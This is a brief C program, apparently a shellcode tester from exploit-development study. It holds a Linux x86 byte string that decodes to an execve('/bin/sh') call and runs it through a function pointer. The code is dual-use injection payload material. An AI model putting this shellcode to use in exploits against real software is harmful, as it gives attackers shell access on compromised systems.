#include <stdio.h>
#include <string.h>

char shellcode[] =
"\xb8\x30\x2f\x73\x68\xc1\xe8\x08\x50\x68\x2f\x62\x69\x6e\x89"
"\xe3\x31\xd2\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80";
void main() {
    int (*funct)();
    funct = (int (*)()) shellcode;
    printf("Shellcode lenght=%d\n",strlen(shellcode));
    (int)(*funct)();
}
